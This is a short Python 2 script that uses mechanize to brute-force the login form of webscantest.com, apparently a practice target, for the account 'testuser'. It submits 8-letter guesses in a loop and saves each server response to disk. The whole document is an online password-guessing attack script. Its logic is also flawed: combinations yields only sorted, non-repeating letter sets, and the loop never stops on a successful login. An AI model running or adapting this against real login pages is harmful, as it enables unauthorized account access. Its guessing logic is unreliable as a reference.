import mechanize
from itertools import combinations 
from string import ascii_lowercase

url = "http://www.webscantest.com/login.php"
browser = mechanize.Browser()
attackNumber = 1

# Possible password list
passwords = (p for p in combinations(ascii_lowercase,8))
for p in passwords:
    browser.open(url)
    browser.select_form(nr=0)
    browser["login"] = 'testuser'
    browser["passwd"] = ''.join(p)
    res = browser.submit()
    content = res.read()
    
    # check if we were taken back to the login page or not
    if content.find('<input type="password" name="passwd" />') > 0:
    	print "Login failed"
    # Print  Response Code
    print res.code
    output = open('response/'+str(attackNumber)+'.txt', 'w')
    output.write(content)
    output.close()
    attackNumber += 1


    
